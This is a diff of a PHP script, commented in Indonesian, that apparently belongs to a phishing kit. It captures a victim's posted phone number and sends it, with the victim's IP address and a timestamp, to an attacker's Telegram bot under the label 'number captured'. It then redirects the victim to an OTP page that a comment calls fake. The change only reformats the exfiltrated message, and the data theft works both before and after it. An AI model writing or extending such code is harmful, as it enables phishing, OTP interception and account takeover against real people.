@@ -1,13 +1,23 @@
 <?php
 session_start();
-$_SESSION['phone'] = $_POST['phone'];
-
-// Kirim notifikasi nomor ke Telegram
 include 'config.php';
-$msg = "📱 NOMOR TERTANGKAP: " . $_POST['phone'] . " | IP: " . $_SERVER['REMOTE_ADDR'];
-file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg));
 
-// Redirect ke halaman OTP palsu
+$phone = $_POST['phone'] ?? 'Tidak diketahui';
+$ip = $_SERVER['REMOTE_ADDR'];
+$time = date('Y-m-d H:i:s');
+
+// Simpan nomor di session untuk halaman OTP
+$_SESSION['phone'] = $phone;
+
+// Kirim notifikasi ke Telegram
+$message = "📱 NOMOR TERTANGKAP\n";
+$message .= "Nomor: $phone\n";
+$message .= "IP: $ip\n";
+$message .= "Waktu: $time";
+
+file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));
+
+// Redirect ke halaman OTP
 header("Location: otp.php");
 exit;
 ?>
